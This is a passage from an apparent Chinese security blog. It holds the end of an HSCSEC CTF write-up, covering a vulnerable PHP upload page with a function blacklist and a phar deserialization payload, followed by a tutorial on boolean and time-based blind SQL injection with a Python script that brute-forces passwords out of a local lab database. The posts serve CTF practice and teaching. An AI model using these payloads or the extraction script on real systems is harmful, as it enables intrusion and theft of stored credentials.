class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>上传图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">&quot;text/javascript&quot;</span> <span class="attr">color</span> = <span class="string">&quot;0,0,255&quot;</span> <span class="attr">opacity</span> = <span class="string">&#x27;0.7&#x27;</span> <span class="attr">zIndex</span> = <span class="string">&quot;-2&quot;</span> <span class="attr">count</span> = <span class="string">&quot;99&quot;</span> <span class="attr">src</span> = <span class="string">&#x27;js/canvas-nest.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 动态背景 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span>&gt;</span>上传你手里最好的图片!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span> = <span class="string">&quot;comment&quot;</span>&gt;</span>If it is excellent enough, you will get the flag!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">&quot;form1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span> = <span class="string">&quot;post&quot;</span> <span class="attr">accept-charset</span> = <span class="string">&quot;utf-8&quot;</span> <span class="attr">enctype</span> = <span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span> <span class="attr">name</span> = <span class="string">&quot;title&quot;</span> <span class="attr">for</span> = <span class="string">&quot;file&quot;</span>&gt;</span>图片:   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;file&quot;</span> <span class="attr">name</span> = <span class="string">&quot;file&quot;</span> <span class="attr">id</span> = <span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">class</span> = <span class="string">&quot;button&quot;</span> <span class="attr">name</span> = <span class="string">&quot;submit&quot;</span> <span class="attr">value</span> = <span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">	error_reporting(0);</span></span><br><span class="line"><span class="meta">	$dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;;</span></span><br><span class="line"><span class="meta">	if(!is_dir($dir)) &#123;</span></span><br><span class="line"><span class="meta">		if(!mkdir($dir, 0777, true)) &#123;</span></span><br><span class="line"><span class="meta">			echo error_get_last()[&#x27;message&#x27;];</span></span><br><span class="line"><span class="meta">			die(&#x27;Failed to make the directory&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta">	chdir($dir);</span></span><br><span class="line"><span class="meta">	if(isset($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="meta">		$name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span></span><br><span class="line"><span class="meta">		$tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="meta">		$ans = exif_imagetype($tmp_name);</span></span><br><span class="line"><span class="meta">		if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt;= 204800) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;filesize too big.&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(!$name) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;filename can not be empty!&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(htaccess)|(user)|(\.\.)|(00)|(#)/i&#x27;, $name) !== 0) &#123;</span></span><br><span class="line"><span class="meta">			die(&#x27;Hacker!&#x27;);</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		if(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span></span><br><span class="line"><span class="meta">			$type = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;];</span></span><br><span class="line"><span class="meta">			if($type == &#x27;image/gif&#x27; or $type == &#x27;image/jpg&#x27; or $type == &#x27;image/png&#x27; or $type == &#x27;image/jpeg&#x27;) &#123;</span></span><br><span class="line"><span class="meta">				echo &quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">			&#125;</span></span><br><span class="line"><span class="meta">			echo(&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;);</span></span><br><span class="line"><span class="meta">			exit;</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		$content = file_get_contents($tmp_name);</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;, $content) !== 0) &#123;</span></span><br><span class="line"><span class="meta">			echo(&#x27;&lt;script&gt;alert(&quot;How dare you upload file with such dangerous function?&quot;)&lt;/script&gt;&#x27;);</span></span><br><span class="line"><span class="meta">			exit;</span></span><br><span class="line"><span class="meta">		&#125;		</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		$extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span></span><br><span class="line"><span class="meta">		if(preg_match(&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;, $extension) === 0) &#123;</span></span><br><span class="line"><span class="meta">			die(&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;);</span></span><br><span class="line"><span class="meta">		&#125; </span></span><br><span class="line"><span class="meta">		$upload_file = $name;</span></span><br><span class="line"><span class="meta">		move_uploaded_file($tmp_name, $upload_file);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		if(file_exists($name)) &#123;</span></span><br><span class="line"><span class="meta">			echo &quot;&lt;p align=\&quot;center\&quot;&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">		&#125; else &#123;</span></span><br><span class="line"><span class="meta">			echo &#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;;</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		echo &quot;&lt;p align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">		#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta"> ?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);  </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();  </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后本地运行得到phar.phar</p>
<p>然后post方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete=phar://aaa.phar</span><br></pre></td></tr></table></figure>

<p>触发file_exists</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HSCSEC/" rel="tag">HSCSEC</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-盲注"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E7%9B%B2%E6%B3%A8/"
    >盲注</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E7%9B%B2%E6%B3%A8/" class="article-date">
  <time datetime="2023-02-02T08:55:52.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1-布尔盲注的判断"><a href="#1-布尔盲注的判断" class="headerlink" title="1.布尔盲注的判断"></a>1.布尔盲注的判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">布尔状态例如：</span><br><span class="line">1.回显不同（内容、长度）</span><br><span class="line">2.HTTP响应状态码不同（200、500）</span><br><span class="line">3.HTTP响应头变化（无条件重定向、设置cookie）</span><br><span class="line">4.基于错误的布尔注入（MySQL是否报错）</span><br></pre></td></tr></table></figure>

<p>有些时候很多东西都被过滤了，如果一个一个的尝试的话会非常麻烦并且费时费力，可以尝试FUZZ黑名单过滤，利用burpsuite   intruder模块</p>
<p>先传入一个参数然后抓包，加一个变量利用intruder模块爆破sql语句关键字就可以了</p>
<h4 id="2-布尔盲注攻击流程"><a href="#2-布尔盲注攻击流程" class="headerlink" title="2.布尔盲注攻击流程"></a>2.布尔盲注攻击流程</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一步：正常查询，返回True（语句执行成功）或者返回False（语句执行成功没有查询到内容）。</span><br><span class="line">第二步：输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。</span><br><span class="line">第三步：利用and进行判断，比如：1 and 1=1和1 and 1=2，1’ and 1=1#和1’ and 1=2#，如果前者执</span><br><span class="line">行的结果不一样，说明是数字型的布尔盲注；如果后者执行的结果不一样，说明是字符型的布尔盲注。</span><br></pre></td></tr></table></figure>



<h5 id="2-获取数据库长度"><a href="#2-获取数据库长度" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内</span><br><span class="line">置函数获取字符串长度：</span><br><span class="line">length() ：单位是字节，utf8编码下,一个汉字三个字节，一个数字或字母一个字节。gbk编码下,一</span><br><span class="line">个汉字两个字节，一个数字或字母一个字节。</span><br><span class="line"><span class="keyword">char_length</span>()：单位为字符，不管汉字还是数字或者是字母都算是一个字符。</span><br><span class="line">比如：</span><br><span class="line"><span class="keyword">select</span> length(database()); </span><br><span class="line"><span class="keyword">select</span> length(database())<span class="operator">=</span><span class="number">8</span>;   #利用这种方式赋值  当赋值正确时会返回正确也可以通过脚本来爆破</span><br></pre></td></tr></table></figure>



<h5 id="3-逐字猜解数据库名"><a href="#3-逐字猜解数据库名" class="headerlink" title="3.逐字猜解数据库名"></a>3.逐字猜解数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在获取数据库名的时候注意数据库的命名规则，他是采用26个英文字母(区分大小写)和0-9的自然数(经常</span><br><span class="line">不需要)加上下划线&#x27;_&#x27;组成，命名简洁明确，多个单词用下划线&#x27;_&#x27;分隔。</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用substr字符串截取函数来逐个判断</span><br><span class="line">substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span></span><br><span class="line">如果substr函数被过滤可以使用  mid()函数来替代</span><br><span class="line">也可以把截取的东西转化为ASCII值来判断</span><br><span class="line">ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br><span class="line">爆破过程可以利用burpsuite   intruder  模块进行爆破</span><br><span class="line">过滤了逗号怎么办？就不能多个参数了吗？利用   <span class="keyword">from</span>   和    <span class="keyword">for</span>  代替</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span>,<span class="number">6</span>,<span class="number">5</span>);与<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span> <span class="keyword">FROM</span> <span class="number">6</span> <span class="keyword">FOR</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h5 id="4-逐字猜解数据库的表名"><a href="#4-逐字猜解数据库的表名" class="headerlink" title="4.逐字猜解数据库的表名"></a>4.逐字猜解数据库的表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="5-逐字猜解字段名"><a href="#5-逐字猜解字段名" class="headerlink" title="5.逐字猜解字段名"></a>5.逐字猜解字段名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="6-逐字猜解记录数据"><a href="#6-逐字猜解记录数据" class="headerlink" title="6.逐字猜解记录数据"></a>6.逐字猜解记录数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 表名))</span><br></pre></td></tr></table></figure>



<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#还可以采用python脚本的形式来进行爆破</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli/Less-5/&#x27;</span></span><br><span class="line"><span class="comment"># select = &#x27;select database()&#x27;     #数据库  security</span></span><br><span class="line"><span class="comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;    #表名  emails,referers,uagents,users</span></span><br><span class="line"><span class="comment"># select  = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;&quot;   #字段名  user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(password) from users&quot;</span>     <span class="comment">#字段内容</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">126</span>):</span><br><span class="line">        payload = <span class="string">f&quot;-1&#x27; or ord(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;?id=&#x27;</span>+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">125</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-布尔盲注的一些函数"><a href="#3-布尔盲注的一些函数" class="headerlink" title="3.布尔盲注的一些函数"></a>3.布尔盲注的一些函数</h4><h5 id="1-substr-函数"><a href="#1-substr-函数" class="headerlink" title="1.substr()函数"></a>1.substr()函数</h5><p>substr(str,pos,len)   表示截取字符串str  从pos这位置截取len个字符</p>
<p>如果过滤了逗号</p>
<p>SELECT SUBSTR(‘2018-08-17’ FROM 6 FOR 5);</p>
<h5 id="2-mid"><a href="#2-mid" class="headerlink" title="2.mid()"></a>2.mid()</h5><p>mid(str,pos,len)    表示截取字符串str  从pos这位置截取len个字符  用法与substr类似</p>
<h5 id="3-right-函数"><a href="#3-right-函数" class="headerlink" title="3.right()函数"></a>3.right()函数</h5><p>right(str,len)    表示从字符串的最右面截取len个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">技巧是结合ascii()</span><br><span class="line">ascii(‘str’) 返回字符串的第一个字符的ascii码 能用ascii时尽量用ascii! 因为字符的比较可能因为字符比较特殊(比如是单引号)而出现很多问题，但是ascii</span><br><span class="line">直接转成数字，就解决了这个问题！</span><br><span class="line">ascii的同名函数是ord 用于过滤ascii的过滤</span><br></pre></td></tr></table></figure>

<h5 id="4-trim-函数"><a href="#4-trim-函数" class="headerlink" title="4.trim()函数"></a>4.trim()函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL trim() 函数 过滤指定的字符串,最常见的用途是移除字首或字尾的空白。</span><br><span class="line">MySQL: TRIM( ), RTRIM( ), LTRIM( )</span><br><span class="line">TRIM() #删除前后空格</span><br><span class="line">RTRIM() #删除字符串结尾空格</span><br><span class="line">LTRIM() #删除字符串起始空格</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）</span><br><span class="line">如果=用regexp替代 那么正确的字符一定在regexp前面 以这个abcd为例</span><br><span class="line">Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)</span><br><span class="line">就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1</span><br></pre></td></tr></table></figure>

<h5 id="5-insert"><a href="#5-insert" class="headerlink" title="5.insert()"></a>5.insert()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Insert(字符串，起始位置，长度，替换为什么)</span><br><span class="line">abc从第一位也就是a开始后的两位(ab)替换为xx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662302958057.png" alt="1662302958057"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">insert</span>((<span class="keyword">insert</span>(<span class="string">&#x27;abcdef&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)),<span class="number">2</span>,<span class="number">99999</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303054792.png" alt="1662303054792"></p>
<h5 id="6-比较字符串"><a href="#6-比较字符串" class="headerlink" title="6.比较字符串"></a>6.比较字符串</h5><p>当字符串比较时是按位比较的</p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303178229.png" alt="1662303178229"></p>
<h5 id="7-like"><a href="#7-like" class="headerlink" title="7.like"></a>7.like</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我 们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</span><br><span class="line">WHERE 子句中可以使用等号 = 来设定获取数据的条件，如 &quot;runoob_</span><br><span class="line">author = &#x27;RUNOOB.COM&#x27;&quot;。 但是有时候我们需要获取 runoob_author 字段含有 &quot;COM&quot; 字符的所 有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</span><br><span class="line">SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或 正则表达式中的星号 *。 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303301148.png" alt="1662303301148"></p>
<h5 id="8-正则表达式-regexp-rlike"><a href="#8-正则表达式-regexp-rlike" class="headerlink" title="8.正则表达式 regexp rlike"></a>8.正则表达式 regexp rlike</h5><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303405311.png" alt="1662303405311"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp是不区分大小写的，需要大小写敏感 需要加上binary关键字</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303431365.png" alt="1662303431365"></p>
<h5 id="9-between"><a href="#9-between" class="headerlink" title="9.between"></a>9.between</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">expr [NOT] BETWEEN begin_expr AND end_expr;</span><br><span class="line">between筛选的是 expr &gt;= begin_expr并且 expr &lt;= end_expr 的数据，如果不存 在则返回的是0；</span><br><span class="line">not between筛选的是 expr &lt; begin_expr或者 expr &gt; end_expr 的数据，如果不 存在则返回的是0； 如果 expr 返回的是 NULL，则between 也返回的是null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303596097.png" alt="1662303596097"></p>
<h5 id="10-in"><a href="#10-in" class="headerlink" title="10.in"></a>10.in</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依然是大小写不敏感的 字符数字都可用 也有not in</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303642507.png" alt="1662303642507"></p>
<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><h4 id="1-延时盲注的介绍"><a href="#1-延时盲注的介绍" class="headerlink" title="1.延时盲注的介绍"></a>1.延时盲注的介绍</h4><p>在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这 种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。既无论用户输入什么页面都是下面这种</p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230641480.png" alt="image-20221210230641480"></p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230656871.png" alt="image-20221210230656871"></p>
<h4 id="2-延时盲注的攻击流程"><a href="#2-延时盲注的攻击流程" class="headerlink" title="2.延时盲注的攻击流程"></a>2.延时盲注的攻击流程</h4><h5 id="1-延时盲注的判断"><a href="#1-延时盲注的判断" class="headerlink" title="1.延时盲注的判断"></a>1.延时盲注的判断</h5><p>由于没有任何的回显内容，所以无法通过查看回显的方法判断是否存在注入，可以使用1 and sleep(5)或 者1’ and sleep(5)#进行测试，如果页面执行有延迟，说明存在漏洞，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">5</span>); #数字型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">5</span>)#<span class="string">&#x27;;#字符型</span></span><br></pre></td></tr></table></figure>

<h5 id="2-获取数据库长度-1"><a href="#2-获取数据库长度-1" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><p>可以使用if语句进行判断，语法格式：if(expr1, expr2, expr3)：判断语句 如果第一个语句正确就执行第 二个语句，否则执行第三个语句</p>
